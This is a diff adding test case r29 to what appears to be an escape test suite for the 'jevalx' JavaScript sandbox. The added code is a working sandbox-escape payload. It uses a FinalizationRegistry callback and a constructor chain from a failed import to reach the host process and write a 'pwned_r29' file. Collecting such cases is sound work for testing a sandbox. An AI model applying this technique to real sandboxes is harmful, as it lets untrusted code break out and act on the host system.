@@ -1464,6 +1464,24 @@ import('').catch(e=>{e.constructor.prototype.__defineSetter__('constructor', c=>
    }
    console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
 },
+r29:async function(){ let case_id = arguments.callee.name; var code=`
+const f = new FinalizationRegistry(_=>import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_r29", ""));
+f.register({});
+(async function a(c) {
+	await Promise.resolve();
+	Array.from({ length: 50000 }, () => () => {});
+	if (c <= 5000) a(c+1);
+})(0);
+false
+`
+   try{
+     console.log(`${case_id} result(raw)=`,await jevalx(code,{dumptree:require('./dumptree')},timeout=666,json_output=false));
+   }catch(ex){
+     console.log(`${case_id} ex=`,ex);
+   }
+   console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
+},
+
 
 tpl:async function(){ let case_id = arguments.callee.name; var code=`
 `
